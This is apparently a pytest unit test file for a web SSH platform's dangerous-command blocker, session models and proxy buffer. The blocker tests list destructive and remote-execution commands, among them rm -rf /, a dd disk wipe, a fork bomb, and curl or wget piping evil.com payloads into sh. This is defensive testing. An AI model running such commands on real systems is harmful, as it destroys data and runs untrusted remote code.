# tests/unit/test_ssh_sessions.py
"""Unit tests for SSH session management logic.

Tests the _is_dangerous command blocker, SSHSession model field defaults,
and the session list response structure. No network, DB, or SSH connection needed.
"""
import uuid
from datetime import UTC, datetime
from unittest.mock import MagicMock, AsyncMock

import pytest

from fleet_platform.api.routes.webssh import _is_dangerous


# ── Command blocklist tests ────────────────────────────────────────────────────

class TestIsDangerous:
    """_is_dangerous returns the matched pattern or None."""

    def test_safe_command_returns_none(self):
        assert _is_dangerous("ls -la") is None

    def test_safe_git_command_returns_none(self):
        assert _is_dangerous("git status") is None

    def test_safe_echo_returns_none(self):
        assert _is_dangerous("echo hello world") is None

    def test_rm_rf_root_is_blocked(self):
        result = _is_dangerous("rm -rf /")
        assert result is not None

    def test_rm_rf_slash_with_space_is_blocked(self):
        result = _is_dangerous("rm -rf / --no-preserve-root")
        assert result is not None

    def test_rm_rf_home_is_blocked(self):
        result = _is_dangerous("rm -rf ~")
        assert result is not None

    def test_dd_is_blocked(self):
        result = _is_dangerous("dd if=/dev/zero of=/dev/sda")
        assert result is not None

    def test_mkfs_is_blocked(self):
        result = _is_dangerous("mkfs.ext4 /dev/sdb1")
        assert result is not None

    def test_redirect_to_block_device_is_blocked(self):
        result = _is_dangerous("cat /dev/urandom > /dev/sda")
        assert result is not None

    def test_fork_bomb_is_blocked(self):
        result = _is_dangerous(":(){ :|:& };:")
        assert result is not None

    def test_chmod_777_root_is_blocked(self):
        result = _is_dangerous("chmod -R 777 /")
        assert result is not None

    def test_curl_pipe_sh_is_blocked(self):
        result = _is_dangerous("curl http://evil.com/payload | sh")
        assert result is not None

    def test_wget_pipe_sh_is_blocked(self):
        result = _is_dangerous("wget -qO- http://evil.com/payload | sh")
        assert result is not None

    def test_base64_pipe_sh_is_blocked(self):
        result = _is_dangerous("echo 'bm8=' | base64 -d | sh")
        assert result is not None

    def test_python_exec_is_blocked(self):
        result = _is_dangerous("python -c exec('import os; os.system(\"rm -rf /\")')")
        assert result is not None

    def test_case_insensitive_rm_rf(self):
        result = _is_dangerous("RM -RF /")
        assert result is not None

    def test_empty_command_is_safe(self):
        assert _is_dangerous("") is None

    def test_whitespace_command_is_safe(self):
        assert _is_dangerous("   ") is None

    def test_normal_rm_of_file_is_safe(self):
        # rm of a specific file (not root or home) is allowed
        assert _is_dangerous("rm -f /tmp/my_file.txt") is None


# ── SSHSession model shape tests ───────────────────────────────────────────────

class TestSSHSessionModel:
    """SSHSession model has correct field defaults and accepts required fields."""

    def test_session_defaults(self):
        from fleet_platform.models.ssh_session import SSHSession
        from sqlalchemy import inspect as sa_inspect
        mapper = sa_inspect(SSHSession)
        # SQLAlchemy mapped_column defaults are DB-level; verify via column metadata
        status_col = mapper.c.status
        assert status_col.default.arg == "active"
        alert_col = mapper.c.alert_count
        assert alert_col.default.arg == 0
        cred_col = mapper.c.credential_source
        assert cred_col.default.arg == "unknown"

    def test_session_with_all_fields(self):
        from fleet_platform.models.ssh_session import SSHSession
        nid = uuid.uuid4()
        uid = uuid.uuid4()
        now = datetime.now(UTC)
        s = SSHSession(
            node_id=nid,
            user_id=uid,
            started_at=now,
            source_ip="192.168.1.10",
            credential_source="node_secret",
            status="active",
            target_ip="10.0.0.5",
            ssh_user="admin",
        )
        assert str(s.source_ip) == "192.168.1.10"
        assert s.credential_source == "node_secret"
        assert s.ssh_user == "admin"
        assert s.target_ip == "10.0.0.5"

    def test_security_event_defaults(self):
        from fleet_platform.models.ssh_session import SecurityEvent
        from sqlalchemy import inspect as sa_inspect
        mapper = sa_inspect(SecurityEvent)
        severity_col = mapper.c.severity
        assert severity_col.default.arg == "info"

    def test_security_event_critical_severity(self):
        from fleet_platform.models.ssh_session import SecurityEvent
        ev = SecurityEvent(
            event_type="block",
            severity="critical",
            command="rm -rf /",
            created_at=datetime.now(UTC),
        )
        assert ev.severity == "critical"
        assert ev.command == "rm -rf /"


# ── Session list response structure tests ─────────────────────────────────────

class TestSessionListResponseStructure:
    """Verify the expected keys in the session list response dict."""

    EXPECTED_KEYS = {
        "id", "node_id", "user_id", "started_at", "ended_at",
        "source_ip", "credential_source", "status", "alert_count",
        "target_ip", "ssh_user",
    }

    def _make_session_dict(self, **overrides) -> dict:
        base = {
            "id": str(uuid.uuid4()),
            "node_id": str(uuid.uuid4()),
            "user_id": str(uuid.uuid4()),
            "started_at": datetime.now(UTC),
            "ended_at": None,
            "source_ip": "10.0.0.1",
            "credential_source": "node_secret",
            "status": "active",
            "alert_count": 0,
            "target_ip": "192.168.1.5",
            "ssh_user": "admin",
        }
        base.update(overrides)
        return base

    def test_session_dict_has_all_expected_keys(self):
        d = self._make_session_dict()
        assert set(d.keys()) == self.EXPECTED_KEYS

    def test_session_status_values(self):
        valid_statuses = ["active", "closed", "killed", "timed_out", "blocked"]
        for status in valid_statuses:
            d = self._make_session_dict(status=status)
            assert d["status"] == status

    def test_session_alert_count_starts_at_zero(self):
        d = self._make_session_dict()
        assert d["alert_count"] == 0

    def test_session_ended_at_is_none_for_active(self):
        d = self._make_session_dict(status="active", ended_at=None)
        assert d["ended_at"] is None

    def test_session_ended_at_set_when_closed(self):
        end = datetime.now(UTC)
        d = self._make_session_dict(status="closed", ended_at=end)
        assert d["ended_at"] is not None


# ── SSHProxySession command buffer tests ─────────────────────────────────────

class TestSSHProxySessionCommandBuffer:
    """Test that the command buffer accumulates and resets correctly."""

    def _make_proxy(self):
        from fleet_platform.api.routes.webssh import SSHProxySession
        ws = MagicMock()
        ws.send_text = AsyncMock()
        return SSHProxySession(ws=ws, session_id=uuid.uuid4(), max_mins=60)

    def test_proxy_initial_buffer_is_empty(self):
        proxy = self._make_proxy()
        assert proxy._cmd_buffer == ""

    def test_proxy_initial_alert_count_is_zero(self):
        proxy = self._make_proxy()
        assert proxy._alert_count == 0

    def test_proxy_initial_session_id_stored(self):
        sid = uuid.uuid4()
        from fleet_platform.api.routes.webssh import SSHProxySession
        ws = MagicMock()
        proxy = SSHProxySession(ws=ws, session_id=sid, max_mins=30)
        assert proxy.session_id == sid
        assert proxy.max_mins == 30

    def test_proxy_recording_chunks_empty_initially(self):
        proxy = self._make_proxy()
        assert proxy._recording_chunks == []

    def test_proxy_chunk_index_starts_at_zero(self):
        proxy = self._make_proxy()
        assert proxy._chunk_index == 0
